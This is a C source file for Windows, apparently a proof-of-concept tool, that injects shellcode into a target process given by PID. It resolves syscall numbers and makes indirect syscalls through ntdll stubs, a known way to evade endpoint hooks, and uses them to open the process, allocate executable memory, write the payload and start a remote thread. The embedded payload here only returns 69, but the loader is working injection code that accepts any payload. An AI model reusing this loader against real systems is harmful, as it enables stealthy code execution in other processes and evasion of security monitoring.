#include <basetsd.h>
#include <stdlib.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>

#include "syscall.h"

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef const UNICODE_STRING *PCUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PCUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

int main(int argc, char *argv[]) {
  /* 
   * absolutely not childish payload that just returns 69:
   *
   * push  rsi
   * mov   rsi, rsp
   * sub   rsp, 020h
   * mov   rax, 69
   * mov   rsp, rsi
   * pop   rsi
   * ret
  */
  unsigned char shellcode[] = { 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xec, 0x20, 0xb8, 0x45, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf4, 0x5e, 0xc3 };
  
  SIZE_T shellcodeSize  = sizeof(shellcode);
  SIZE_T written        = 0;

  NTSTATUS s      = 0;
  PVOID buffer    = NULL;
  HANDLE hProcess = NULL;
  HANDLE hThread  = NULL;

  if (argc < 2) {
    fprintf(stderr, "Usage %s <PID>\n", argv[0]);
    return EXIT_FAILURE; 
  }

  SSNTable t = { 0 };
  if(SSNTableInit(&t) != 0) {
    fprintf(stderr, "Failed to init SSN Table\n");
    return 1;
  }

  DWORD dwPid = atoi(argv[1]);
  
  DWORD dwNtOpenProcess           = SSNTableSearch(&t, "NtOpenProcess").ssn;
  DWORD dwNtAllocateVirtualMemory = SSNTableSearch(&t, "NtAllocateVirtualMemory").ssn;
  DWORD dwNtWriteVirtualMemory    = SSNTableSearch(&t, "NtWriteVirtualMemory").ssn;
  DWORD dwNtCreateThreadEx        = SSNTableSearch(&t, "NtCreateThreadEx").ssn;

  fprintf(stdout, "%-30s %3lu (0x%lx)\n", "NtOpenProcess", dwNtOpenProcess, dwNtOpenProcess);
  fprintf(stdout, "%-30s %3lu (0x%lx)\n", "NtAllocateVirtualMemory", dwNtAllocateVirtualMemory, dwNtAllocateVirtualMemory);
  fprintf(stdout, "%-30s %3lu (0x%lx)\n", "NtWriteVirtualMemory", dwNtWriteVirtualMemory, dwNtWriteVirtualMemory);
  fprintf(stdout, "%-30s %3lu (0x%lx)\n", "NtCreateThreadEx", dwNtCreateThreadEx, dwNtCreateThreadEx);

  // TODO: find more elegant solution
  srand(time(0));
  g_lpSyscallAddr = GetProcAddress(GetModuleHandle("ntdll.dll"), t.items[rand() % t.count].lpFuncName);
#ifdef WINE
  g_lpSyscallAddr += 24;
#else 
  g_lpSyscallAddr += 0x12L;
#endif
  fprintf(stdout, "g_lpSyscallAddr = 0x%p\n", g_lpSyscallAddr);

  SSNTableFree(&t);

  CLIENT_ID CID = { .UniqueProcess = (HANDLE)(ULONG_PTR)dwPid, .UniqueThread = 0 };
  OBJECT_ATTRIBUTES OA1 = { .Length = sizeof(OBJECT_ATTRIBUTES), 0 };
  OBJECT_ATTRIBUTES OA2 = { .Length = sizeof(OBJECT_ATTRIBUTES), 0 };

  fprintf(stdout, "[i] Opening handle to process %ld\n", dwPid);
  s = Syscall(dwNtOpenProcess, &hProcess, PROCESS_ALL_ACCESS, &OA1, &CID);
  if (s) {
    fprintf(stderr, "[-] NtOpenProcess failed (0x%lx)\n", s);
    return EXIT_FAILURE;
  }
  fprintf(stdout, "[i] Loading payload to remote process memory\n");
  s = Syscall(dwNtAllocateVirtualMemory, hProcess, &buffer, 0, &shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (s) {
    fprintf(stderr, "[-] NtAllocateVirtualMemory failed (0x%lx)\n", s);
    return EXIT_FAILURE;
  }
  fprintf(stdout, "[+] Successfully allocated %zu bytes in remote process memory\n", shellcodeSize);
  s = Syscall(dwNtWriteVirtualMemory, hProcess, buffer, shellcode, sizeof(shellcode), &written);
  if (s) {
    fprintf(stderr, "[-] NtWriteVirtualMemory failed (0x%lx)\n", s);
    return EXIT_FAILURE;
  }
  fprintf(stdout, "[+] Successfully written %zu bytes to remote process memory\n", written);
  fprintf(stderr, "[i] Running payload...\n");
  s = Syscall(dwNtCreateThreadEx, &hThread, THREAD_ALL_ACCESS, &OA2, hProcess, (PTHREAD_START_ROUTINE)buffer, NULL, 0, 0, 0, 0, NULL);
  if (s) {
    fprintf(stderr, "[-] NtCreateThreadEx failed (0x%lx)\n", s);
    return EXIT_FAILURE;
  }
  WaitForSingleObject(hThread, INFINITE);

  DWORD dwRet = 0;
  GetExitCodeThread(hThread, &dwRet);
  fprintf(stdout, "[i] Remote thread finished with exit code %ld\n", dwRet);
  fprintf(stdout, "[+] Done.\n");

  return EXIT_SUCCESS;
}

